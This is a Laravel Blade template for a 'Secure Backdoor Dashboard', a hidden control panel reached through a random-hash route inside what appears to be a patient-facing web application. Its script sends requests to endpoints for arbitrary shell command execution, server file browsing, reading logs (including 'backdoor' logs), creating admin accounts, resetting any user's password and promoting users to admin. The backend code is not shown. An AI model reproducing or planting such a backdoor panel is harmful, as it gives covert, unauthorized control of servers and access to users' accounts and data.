<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Secure Backdoor Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #f8f9fa;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
        }
        
        .header {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 15px 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 {
            font-size: 24px;
            display: flex;
            align-items: center;
        }
        
        .header h1::before {
            content: '🛡️';
            margin-right: 10px;
        }
        
        .logout-btn {
            background: rgba(255,255,255,0.2);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
            font-size: 14px;
            transition: background 0.3s;
        }
        
        .logout-btn:hover {
            background: rgba(255,255,255,0.3);
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            overflow: hidden;
        }
        
        .card-header {
            background: #f8f9fa;
            padding: 15px 20px;
            border-bottom: 1px solid #e9ecef;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .card-body {
            padding: 20px;
        }
        
        .system-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }
        
        .info-item {
            padding: 15px;
            background: #f8f9fa;
            border-radius: 6px;
            border-left: 4px solid #007bff;
        }
        
        .info-item strong {
            display: block;
            color: #495057;
            font-size: 12px;
            text-transform: uppercase;
            margin-bottom: 5px;
        }
        
        .info-value {
            font-size: 16px;
            font-weight: 600;
            color: #212529;
        }
        
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            margin: 5px;
        }
        
        .btn-primary {
            background: #007bff;
            color: white;
        }
        
        .btn-success {
            background: #28a745;
            color: white;
        }
        
        .btn-warning {
            background: #ffc107;
            color: #212529;
        }
        
        .btn-danger {
            background: #dc3545;
            color: white;
        }
        
        .btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            color: #495057;
        }
        
        .form-control {
            width: 100%;
            padding: 10px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-size: 14px;
        }
        
        .form-control:focus {
            outline: none;
            border-color: #007bff;
            box-shadow: 0 0 0 2px rgba(0, 123, 255, 0.25);
        }
        
        .alert {
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 15px;
            border-left: 4px solid;
        }
        
        .alert-success {
            background: #d4edda;
            color: #155724;
            border-left-color: #28a745;
        }
        
        .alert-danger {
            background: #f8d7da;
            color: #721c24;
            border-left-color: #dc3545;
        }
        
        .alert-info {
            background: #d1ecf1;
            color: #0c5460;
            border-left-color: #17a2b8;
        }
        
        .actions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }
        
        .action-group {
            border: 1px solid #e9ecef;
            border-radius: 6px;
            padding: 15px;
        }
        
        .action-group h4 {
            margin-bottom: 10px;
            color: #495057;
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
            justify-content: center;
            align-items: center;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            border-bottom: 1px solid #dee2e6;
            background-color: #f8f9fa;
        }
        
        .modal-header h3 {
            margin: 0;
            color: #495057;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 24px;
            font-weight: bold;
            color: #6c757d;
            cursor: pointer;
            padding: 0;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .close-btn:hover {
            color: #dc3545;
        }
        
        .loading {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px;
            color: #6c757d;
        }
        
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        
        .table th,
        .table td {
            padding: 8px 12px;
            text-align: left;
            border-bottom: 1px solid #dee2e6;
        }
        
        .table th {
            background-color: #f8f9fa;
            font-weight: 600;
            color: #495057;
        }
        
        .table-striped tbody tr:nth-of-type(odd) {
            background-color: rgba(0,0,0,.05);
        }
        
        .badge {
            display: inline-block;
            padding: 0.25em 0.4em;
            font-size: 75%;
            font-weight: 700;
            line-height: 1;
            text-align: center;
            white-space: nowrap;
            vertical-align: baseline;
            border-radius: 0.25rem;
        }
        
        .badge-primary { color: #fff; background-color: #007bff; }
        .badge-secondary { color: #fff; background-color: #6c757d; }
        .badge-success { color: #fff; background-color: #28a745; }
        .badge-danger { color: #fff; background-color: #dc3545; }
        .badge-warning { color: #212529; background-color: #ffc107; }
        .badge-info { color: #fff; background-color: #17a2b8; }
        
        .breadcrumb {
            font-size: 14px;
            color: #6c757d;
            background-color: #f8f9fa;
        }
        
        .file-item:hover {
            background-color: #f8f9fa;
        }
        
        .system-info h4 {
            margin-top: 20px;
            margin-bottom: 10px;
        }
        
        .system-info ul {
            list-style: none;
            padding-left: 0;
        }
        
        .system-info li {
            padding: 5px 0;
            border-bottom: 1px solid #eee;
        }
        
        .system-info li:last-child {
            border-bottom: none;
        }
        
        .modal-content {
            background: white;
            border-radius: 8px;
            padding: 20px;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #e9ecef;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #6c757d;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .session-info {
            background: #fff3cd;
            color: #856404;
            padding: 10px;
            border-radius: 4px;
            font-size: 12px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <h1>Secure Backdoor Dashboard</h1>
            <button onclick="logout()" class="logout-btn">🚪 Logout</button>
        </div>
    </div>

    <div class="container">
        <div class="session-info">
            ⏱️ Session active. Auto-logout in <span id="sessionTimer">30:00</span> minutes.
        </div>

        <div id="messageContainer"></div>

        <div class="dashboard-grid">
            <!-- System Information -->
            <div class="card">
                <div class="card-header">
                    📊 System Information
                </div>
                <div class="card-body">
                    <div class="system-info">
                        <div class="info-item">
                            <strong>PHP Version</strong>
                            <div class="info-value">{{ $systemInfo['php_version'] }}</div>
                        </div>
                        <div class="info-item">
                            <strong>Laravel Version</strong>
                            <div class="info-value">{{ $systemInfo['laravel_version'] }}</div>
                        </div>
                        <div class="info-item">
                            <strong>Database</strong>
                            <div class="info-value">{{ strtoupper($systemInfo['database_type']) }}</div>
                        </div>
                        <div class="info-item">
                            <strong>Environment</strong>
                            <div class="info-value">{{ strtoupper($systemInfo['app_env']) }}</div>
                        </div>
                        <div class="info-item">
                            <strong>Total Users</strong>
                            <div class="info-value">{{ $systemInfo['user_count'] }}</div>
                        </div>
                        <div class="info-item">
                            <strong>Admin Users</strong>
                            <div class="info-value">{{ $systemInfo['admin_count'] }}</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Admin Management -->
            <div class="card">
                <div class="card-header">
                    👤 Admin Management
                </div>
                <div class="card-body">
                    <button onclick="showCreateAdminModal()" class="btn btn-success">
                        ➕ Create New Admin
                    </button>
                    <button onclick="showPasswordResetModal()" class="btn btn-warning">
                        🔑 Reset User Password
                    </button>
                    <button onclick="showAdvancedUserListModal()" class="btn btn-primary">
                        📋 View All Users
                    </button>
                </div>
            </div>

            <!-- System Maintenance -->
            <div class="card">
                <div class="card-header">
                    🔧 System Maintenance
                </div>
                <div class="card-body">
                    <div class="actions-grid">
                        <div class="action-group">
                            <h4>Cache Management</h4>
                            <button onclick="systemMaintenance('clear_cache')" class="btn btn-warning">
                                🗑️ Clear Cache
                            </button>
                        </div>
                        <div class="action-group">
                            <h4>Application</h4>
                            <button onclick="systemMaintenance('optimize')" class="btn btn-success">
                                ⚡ Optimize App
                            </button>
                        </div>
                        <div class="action-group">
                            <h4>Database</h4>
                            <button onclick="systemMaintenance('migrate')" class="btn btn-primary">
                                🔄 Run Migrations
                            </button>
                        </div>
                        <div class="action-group">
                            <h4>Storage</h4>
                            <button onclick="systemMaintenance('storage_link')" class="btn btn-info">
                                🔗 Storage Link
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Database Operations -->
            <div class="card">
                <div class="card-header">
                    🗄️ Database Operations
                </div>
                <div class="card-body">
                    <button onclick="databaseOperation('backup')" class="btn btn-success">
                        💾 Create Backup
                    </button>
                    <button onclick="databaseOperation('stats')" class="btn btn-primary">
                        📊 Database Stats
                    </button>
                    <button onclick="databaseOperation('cleanup')" class="btn btn-warning">
                        🧹 Cleanup Database
                    </button>
                </div>
            </div>
            
            <!-- Command Execution -->
            <div class="card">
                <div class="card-header">
                    💻 Command Execution
                </div>
                <div class="card-body">
                    <button onclick="showCommandExecutionModal()" class="btn btn-danger">
                        ⚡ Execute Command
                    </button>
                    <button onclick="showAdvancedSystemInfoModal()" class="btn btn-info">
                        📋 Advanced System Info
                    </button>
                </div>
            </div>
            
            <!-- File Manager -->
            <div class="card">
                <div class="card-header">
                    📁 File Manager
                </div>
                <div class="card-body">
                    <button onclick="showFileManagerModal()" class="btn btn-primary">
                        📂 Browse Files
                    </button>
                    <button onclick="showLogViewerModal()" class="btn btn-warning">
                        📄 View Logs
                    </button>
                </div>
            </div>
            
            <!-- User Management Advanced -->
            <div class="card">
                <div class="card-header">
                    👥 Advanced User Management
                </div>
                <div class="card-body">
                    <button onclick="showAdvancedUserListModal()" class="btn btn-primary">
                        👁️ Advanced User List
                    </button>
                    <button onclick="showUserModificationModal()" class="btn btn-warning">
                        ⚙️ Modify Users
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Create Admin Modal -->
    <div id="createAdminModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Create New Admin</h3>
                <button onclick="closeModal('createAdminModal')" class="close-btn">&times;</button>
            </div>
            <form id="createAdminForm">
                <div class="form-group">
                    <label>Full Name</label>
                    <input type="text" name="name" class="form-control" required>
                </div>
                <div class="form-group">
                    <label>Email Address</label>
                    <input type="email" name="email" class="form-control" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" class="form-control" required minlength="8">
                </div>
                <button type="submit" class="btn btn-success">Create Admin</button>
                <button type="button" onclick="closeModal('createAdminModal')" class="btn btn-secondary">Cancel</button>
            </form>
        </div>
    </div>

    <!-- Password Reset Modal -->
    <div id="passwordResetModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Reset User Password</h3>
                <button onclick="closeModal('passwordResetModal')" class="close-btn">&times;</button>
            </div>
            <form id="passwordResetForm">
                <div class="form-group">
                    <label>User ID</label>
                    <input type="number" name="user_id" class="form-control" required>
                    <small>Enter the user ID from the database</small>
                </div>
                <div class="form-group">
                    <label>New Password</label>
                    <input type="password" name="new_password" class="form-control" required minlength="8">
                </div>
                <button type="submit" class="btn btn-warning">Reset Password</button>
                <button type="button" onclick="closeModal('passwordResetModal')" class="btn btn-secondary">Cancel</button>
            </form>
        </div>
    </div>


    <!-- Database Stats Modal -->
    <div id="dbStatsModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Database Statistics</h3>
                <button onclick="closeModal('dbStatsModal')" class="close-btn">&times;</button>
            </div>
            <div id="dbStatsContent">
                <div class="loading">
                    <div class="spinner"></div>Loading statistics...
                </div>
            </div>
        </div>
    </div>

    <!-- Command Execution Modal -->
    <div id="commandModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>⚡ Command Execution</h3>
                <button onclick="closeModal('commandModal')" class="close-btn">&times;</button>
            </div>
            <form id="commandForm">
                <div class="form-group">
                    <label>Command</label>
                    <input type="text" name="command" class="form-control" placeholder="ls -la" required>
                    <small style="color: #dc3545;">⚠️ Dangerous commands are blocked for security</small>
                </div>
                <button type="submit" class="btn btn-danger">Execute</button>
                <button type="button" onclick="closeModal('commandModal')" class="btn btn-secondary">Cancel</button>
            </form>
            <div id="commandOutput" style="margin-top: 15px; background: #000; color: #0f0; padding: 15px; border-radius: 4px; font-family: monospace; white-space: pre-wrap; max-height: 300px; overflow-y: auto; display: none;"></div>
        </div>
    </div>
    
    <!-- File Manager Modal -->
    <div id="fileManagerModal" class="modal">
        <div class="modal-content" style="max-width: 800px; max-height: 90vh;">
            <div class="modal-header">
                <h3>📁 File Manager</h3>
                <button onclick="closeModal('fileManagerModal')" class="close-btn">&times;</button>
            </div>
            <div id="fileManagerContent">
                <div class="loading">
                    <div class="spinner"></div>Loading files...
                </div>
            </div>
        </div>
    </div>
    
    <!-- Log Viewer Modal -->
    <div id="logViewerModal" class="modal">
        <div class="modal-content" style="max-width: 900px; max-height: 90vh;">
            <div class="modal-header">
                <h3>📄 Log Viewer</h3>
                <button onclick="closeModal('logViewerModal')" class="close-btn">&times;</button>
            </div>
            <div style="margin-bottom: 15px;">
                <select id="logType" style="padding: 8px; margin-right: 10px;">
                    <option value="laravel">Laravel Logs</option>
                    <option value="backdoor">Backdoor Logs</option>
                </select>
                <input type="number" id="logLines" value="100" min="10" max="1000" style="padding: 8px; width: 80px; margin-right: 10px;">
                <button onclick="loadLogs()" class="btn btn-primary">Load Logs</button>
            </div>
            <div id="logContent" style="background: #000; color: #fff; padding: 15px; border-radius: 4px; font-family: monospace; white-space: pre-wrap; max-height: 500px; overflow-y: auto;">Click 'Load Logs' to view logs</div>
        </div>
    </div>
    
    <!-- Advanced User List Modal -->
    <div id="advancedUserListModal" class="modal">
        <div class="modal-content" style="max-width: 900px; max-height: 90vh;">
            <div class="modal-header">
                <h3>👥 Advanced User Management</h3>
                <button onclick="closeModal('advancedUserListModal')" class="close-btn">&times;</button>
            </div>
            <div id="advancedUserListContent">
                <div class="loading">
                    <div class="spinner"></div>Loading users...
                </div>
            </div>
        </div>
    </div>
    
    <!-- User Modification Modal -->
    <div id="userModificationModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>⚙️ Modify User</h3>
                <button onclick="closeModal('userModificationModal')" class="close-btn">&times;</button>
            </div>
            <form id="userModificationForm">
                <div class="form-group">
                    <label>User ID</label>
                    <input type="number" name="user_id" class="form-control" required>
                </div>
                <div class="form-group">
                    <label>Action</label>
                    <select name="action" class="form-control" required>
                        <option value="promote">Promote to Admin</option>
                        <option value="demote">Demote to Patient</option>
                        <option value="activate">Activate User</option>
                        <option value="deactivate">Deactivate User</option>
                        <option value="approve">Approve Registration</option>
                        <option value="reject">Reject Registration</option>
                    </select>
                </div>
                <button type="submit" class="btn btn-warning">Modify User</button>
                <button type="button" onclick="closeModal('userModificationModal')" class="btn btn-secondary">Cancel</button>
            </form>
        </div>
    </div>
    
    <!-- Advanced System Info Modal -->
    <div id="advancedSystemInfoModal" class="modal">
        <div class="modal-content" style="max-width: 800px; max-height: 90vh;">
            <div class="modal-header">
                <h3>📋 Advanced System Information</h3>
                <button onclick="closeModal('advancedSystemInfoModal')" class="close-btn">&times;</button>
            </div>
            <div id="advancedSystemInfoContent">
                <div class="loading">
                    <div class="spinner"></div>Loading system information...
                </div>
            </div>
        </div>
    </div>

    <script>
        let sessionId = '';
        let sessionTimer = 1800; // 30 minutes

        document.addEventListener('DOMContentLoaded', function() {
            sessionId = sessionStorage.getItem('backdoor_session') || getUrlParameter('session_id');
            
            if (!sessionId) {
                window.location.href = '{{ route("secure.backdoor") }}';
                return;
            }
            
            startSessionTimer();
            setupForms();
        });

        function getUrlParameter(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        function startSessionTimer() {
            const timerElement = document.getElementById('sessionTimer');
            
            setInterval(() => {
                sessionTimer--;
                if (sessionTimer <= 0) {
                    logout();
                    return;
                }
                
                const minutes = Math.floor(sessionTimer / 60);
                const seconds = sessionTimer % 60;
                timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            }, 1000);
        }

        function setupForms() {
            // Create Admin Form
            document.getElementById('createAdminForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const formData = new FormData(e.target);
                
                try {
                    const response = await makeSecureRequest('{{ route("secure.backdoor.admin.create") }}', {
                        name: formData.get('name'),
                        email: formData.get('email'),
                        password: formData.get('password')
                    });
                    
                    if (response.success) {
                        showMessage('Admin created successfully!', 'success');
                        closeModal('createAdminModal');
                        e.target.reset();
                    } else {
                        showMessage(response.message || 'Failed to create admin', 'danger');
                    }
                } catch (error) {
                    showMessage('Error creating admin', 'danger');
                }
            });

            // Password Reset Form
            document.getElementById('passwordResetForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const formData = new FormData(e.target);
                
                try {
                    const response = await makeSecureRequest('{{ route("secure.backdoor.password.reset") }}', {
                        user_id: parseInt(formData.get('user_id')),
                        new_password: formData.get('new_password')
                    });
                    
                    if (response.success) {
                        showMessage('Password reset successfully!', 'success');
                        closeModal('passwordResetModal');
                        e.target.reset();
                    } else {
                        showMessage(response.message || 'Failed to reset password', 'danger');
                    }
                } catch (error) {
                    showMessage('Error resetting password', 'danger');
                }
            });
        }

        async function makeSecureRequest(url, data, method = 'POST') {
            const response = await fetch(url, {
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content'),
                    'X-Backdoor-Session': sessionId
                },
                body: JSON.stringify(data)
            });
            
            return await response.json();
        }

        async function systemMaintenance(action) {
            if (!confirm(`Are you sure you want to execute: ${action}?`)) {
                return;
            }

            try {
                showMessage(`Executing ${action}...`, 'info');
                const response = await makeSecureRequest('{{ route("secure.backdoor.maintenance") }}', { action });
                
                if (response.success) {
                    showMessage(response.message, 'success');
                } else {
                    showMessage(response.message || 'Maintenance failed', 'danger');
                }
            } catch (error) {
                showMessage('Error executing maintenance', 'danger');
            }
        }

        async function databaseOperation(operation) {
            try {
                showMessage(`Executing ${operation}...`, 'info');
                const response = await makeSecureRequest('{{ route("secure.backdoor.database") }}', { operation });
                
                if (response.success) {
                    if (operation === 'stats') {
                        showDatabaseStats(response.stats);
                    } else {
                        showMessage(response.message, 'success');
                        if (response.path) {
                            showMessage(`Backup saved to: ${response.path}`, 'info');
                        }
                    }
                } else {
                    showMessage(response.message || 'Database operation failed', 'danger');
                }
            } catch (error) {
                showMessage('Error executing database operation', 'danger');
            }
        }

        function showDatabaseStats(stats) {
            const content = `
                <div class="system-info">
                    ${Object.entries(stats).map(([key, value]) => `
                        <div class="info-item">
                            <strong>${key.replace('_', ' ').toUpperCase()}</strong>
                            <div class="info-value">${value}</div>
                        </div>
                    `).join('')}
                </div>
            `;
            
            document.getElementById('dbStatsContent').innerHTML = content;
            document.getElementById('dbStatsModal').style.display = 'flex';
        }

        function showCreateAdminModal() {
            document.getElementById('createAdminModal').style.display = 'flex';
        }

        function showPasswordResetModal() {
            document.getElementById('passwordResetModal').style.display = 'flex';
        }


        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        function showMessage(message, type) {
            const container = document.getElementById('messageContainer');
            container.innerHTML = `
                <div class="alert alert-${type}" style="margin-bottom: 20px;">
                    ${message}
                </div>
            `;
            
            // Auto-remove after 5 seconds
            setTimeout(() => {
                container.innerHTML = '';
            }, 5000);
        }

        // Command execution
        function showCommandExecutionModal() {
            document.getElementById('commandModal').style.display = 'flex';
        }
        
        document.getElementById('commandForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const command = this.command.value;
            
            try {
                const response = await makeSecureRequest('{{ url("secure-system-access-fd09d7bf5e7ce1c40dc2a65d6d7a8f53/command") }}', { command });
                const outputDiv = document.getElementById('commandOutput');
                outputDiv.style.display = 'block';
                
                if (response.success) {
                    outputDiv.textContent = response.output || 'Command executed successfully (no output)';
                    outputDiv.style.color = '#0f0';
                } else {
                    outputDiv.textContent = 'Error: ' + (response.error || 'Command execution failed');
                    outputDiv.style.color = '#f00';
                }
            } catch (error) {
                const outputDiv = document.getElementById('commandOutput');
                outputDiv.style.display = 'block';
                outputDiv.style.color = '#f00';
                outputDiv.textContent = 'Network error: ' + error.message;
            }
        });
        
        // File manager
        async function showFileManagerModal() {
            document.getElementById('fileManagerModal').style.display = 'flex';
            
            try {
                const basePath = {!! json_encode(base_path()) !!};
                console.log('File Manager - Base path:', basePath);
                
                const response = await makeSecureRequest('{{ url("secure-system-access-fd09d7bf5e7ce1c40dc2a65d6d7a8f53/files") }}', { 
                    action: 'list', 
                    path: basePath
                });
                
                console.log('File Manager - Response:', response);
                const content = document.getElementById('fileManagerContent');
                
                if (response.success) {
                    let html = '<div class="breadcrumb" style="padding: 10px; border-bottom: 1px solid #ddd; background: #f8f9fa;">';
                    html += 'Current Path: <code>' + (response.currentPath || '/') + '</code> ';
                    html += '<span style="color: #666;">(' + (response.count || 0) + ' items)</span>';
                    html += '</div>';
                    html += '<div class="file-list" style="max-height: 500px; overflow-y: auto;">';
                    
                    if (response.files && response.files.length > 0) {
                        response.files.forEach(file => {
                            const icon = file.type === 'directory' ? '📁' : '📄';
                            const readableColor = file.readable ? '#28a745' : '#dc3545';
                            const writableIcon = file.writable ? '✏️' : '🔒';
                            
                            html += '<div class="file-item" style="padding: 10px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center;">';
                            html += '<div style="display: flex; align-items: center;">';
                            html += '<span style="margin-right: 10px; font-size: 16px;">' + icon + '</span>';
                            html += '<span style="font-weight: 500;">' + file.name + '</span>';
                            html += '</div>';
                            html += '<div style="display: flex; align-items: center; gap: 15px; font-size: 12px; color: #666;">';
                            html += '<span style="min-width: 60px;">' + file.size + '</span>';
                            html += '<span style="min-width: 130px;">' + file.modified + '</span>';
                            html += '<span style="font-family: monospace; color: ' + readableColor + ';">' + file.permissions + '</span>';
                            html += '<span title="' + (file.writable ? 'Writable' : 'Read-only') + '">' + writableIcon + '</span>';
                            html += '</div>';
                            html += '</div>';
                        });
                    } else {
                        html += '<div style="padding: 20px; text-align: center; color: #666;">No files found in this directory</div>';
                    }
                    
                    html += '</div>';
                    content.innerHTML = html;
                } else {
                    let errorMsg = 'Failed to load files';
                    if (response.error) {
                        errorMsg = response.error;
                    } else if (response.message) {
                        errorMsg = response.message;
                    }
                    
                    content.innerHTML = '<div class="alert alert-danger">Error: ' + errorMsg + '</div>';
                    
                    // Show debug info if available
                    if (response.debug) {
                        content.innerHTML += '<details style="margin-top: 10px;"><summary>Debug Information</summary><pre style="font-size: 11px; background: #f8f9fa; padding: 10px; margin-top: 10px;">' + JSON.stringify(response.debug, null, 2) + '</pre></details>';
                    }
                }
            } catch (error) {
                document.getElementById('fileManagerContent').innerHTML = '<div class="alert alert-danger">Network error: ' + error.message + '</div>';
            }
        }
        
        // Log viewer
        function showLogViewerModal() {
            document.getElementById('logViewerModal').style.display = 'flex';
        }
        
        async function loadLogs() {
            const logType = document.getElementById('logType').value;
            const lines = document.getElementById('logLines').value;
            
            try {
                const response = await makeSecureRequest('{{ url("secure-system-access-fd09d7bf5e7ce1c40dc2a65d6d7a8f53/logs") }}', { log_type: logType, lines: lines });
                const content = document.getElementById('logContent');
                
                if (response.success) {
                    if (response.logs && response.logs.length > 0) {
                        // Join array of log lines into a single string
                        const logText = Array.isArray(response.logs) ? response.logs.join('') : response.logs;
                        content.textContent = logText;
                        
                        // Add log count info
                        const logInfo = document.createElement('div');
                        logInfo.style.cssText = 'background: #333; color: #0f0; padding: 5px; margin-bottom: 10px; font-size: 12px;';
                        logInfo.textContent = `Showing ${response.lines || response.logs.length} lines of ${logType} logs`;
                        content.insertBefore(logInfo, content.firstChild);
                    } else {
                        content.textContent = 'No logs found for ' + logType;
                    }
                } else {
                    content.textContent = 'Error: ' + (response.message || response.error || 'Failed to load logs');
                }
            } catch (error) {
                document.getElementById('logContent').textContent = 'Network error: ' + error.message;
            }
        }
        
        // Advanced user list
        async function showAdvancedUserListModal() {
            document.getElementById('advancedUserListModal').style.display = 'flex';
            
            try {
                const response = await makeSecureRequest('{{ url("secure-system-access-fd09d7bf5e7ce1c40dc2a65d6d7a8f53/users/list") }}', {});
                const content = document.getElementById('advancedUserListContent');
                
                if (response.success) {
                    let html = '<table class="table table-striped" style="margin-top: 15px;">';
                    html += '<thead><tr><th>ID</th><th>Name</th><th>Email</th><th>Role</th><th>Status</th><th>Created</th><th>Last Login</th></tr></thead><tbody>';
                    
                    response.users.forEach(user => {
                        html += '<tr>';
                        html += '<td>' + user.id + '</td>';
                        html += '<td>' + (user.name || 'N/A') + '</td>';
                        html += '<td>' + (user.email || 'N/A') + '</td>';
                        html += '<td><span class="badge badge-' + (user.role === 'admin' ? 'danger' : 'secondary') + '">' + (user.role || 'patient') + '</span></td>';
                        html += '<td><span class="badge badge-' + (user.status === 'active' ? 'success' : 'warning') + '">' + (user.status || 'active') + '</span></td>';
                        html += '<td>' + (user.created_at || 'N/A') + '</td>';
                        html += '<td>' + (user.last_login || 'Never') + '</td>';
                        html += '</tr>';
                    });
                    
                    html += '</tbody></table>';
                    content.innerHTML = html;
                } else {
                    content.innerHTML = '<div class="alert alert-danger">Error: ' + (response.error || 'Failed to load users') + '</div>';
                }
            } catch (error) {
                document.getElementById('advancedUserListContent').innerHTML = '<div class="alert alert-danger">Network error: ' + error.message + '</div>';
            }
        }
        
        // User modification
        function showUserModificationModal() {
            document.getElementById('userModificationModal').style.display = 'flex';
        }
        
        document.getElementById('userModificationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const userId = this.user_id.value;
            const action = this.action.value;
            
            try {
                const response = await makeSecureRequest('{{ url("secure-system-access-fd09d7bf5e7ce1c40dc2a65d6d7a8f53/users/modify") }}', {
                    user_id: userId, 
                    action: action 
                });
                
                if (response.success) {
                    showMessage(response.message, 'success');
                    closeModal('userModificationModal');
                    this.reset();
                } else {
                    showMessage(response.error || 'User modification failed', 'danger');
                }
            } catch (error) {
                showMessage('User modification failed: ' + error.message, 'danger');
            }
        });
        
        // Advanced system info
        async function showAdvancedSystemInfoModal() {
            document.getElementById('advancedSystemInfoModal').style.display = 'flex';
            
            try {
                const response = await makeSecureRequest('{{ url("secure-system-access-fd09d7bf5e7ce1c40dc2a65d6d7a8f53/system/advanced") }}', {});
                const content = document.getElementById('advancedSystemInfoContent');
                
                if (response.success) {
                    let html = '<div class="system-info" style="max-height: 500px; overflow-y: auto;">';
                    Object.keys(response.info).forEach(category => {
                        html += '<h4 style="color: #007bff; border-bottom: 1px solid #ddd; padding-bottom: 5px;">' + category + '</h4>';
                        html += '<ul style="margin-bottom: 20px;">';
                        Object.keys(response.info[category]).forEach(key => {
                            html += '<li style="margin-bottom: 5px;"><strong>' + key + ':</strong> ' + response.info[category][key] + '</li>';
                        });
                        html += '</ul>';
                    });
                    html += '</div>';
                    content.innerHTML = html;
                } else {
                    content.innerHTML = '<div class="alert alert-danger">Error: ' + (response.error || 'Failed to load system info') + '</div>';
                }
            } catch (error) {
                document.getElementById('advancedSystemInfoContent').innerHTML = '<div class="alert alert-danger">Network error: ' + error.message + '</div>';
            }
        }
        
        async function logout() {
            try {
                await makeSecureRequest('{{ route("secure.backdoor.logout") }}', {});
            } catch (error) {
                // Continue with logout even if request fails
            }
            
            sessionStorage.removeItem('backdoor_session');
            window.location.href = '{{ route("secure.backdoor") }}';
        }

        // Close modals when clicking outside
        window.addEventListener('click', (e) => {
            if (e.target.classList.contains('modal')) {
                e.target.style.display = 'none';
            }
        });
    </script>
</body>
</html>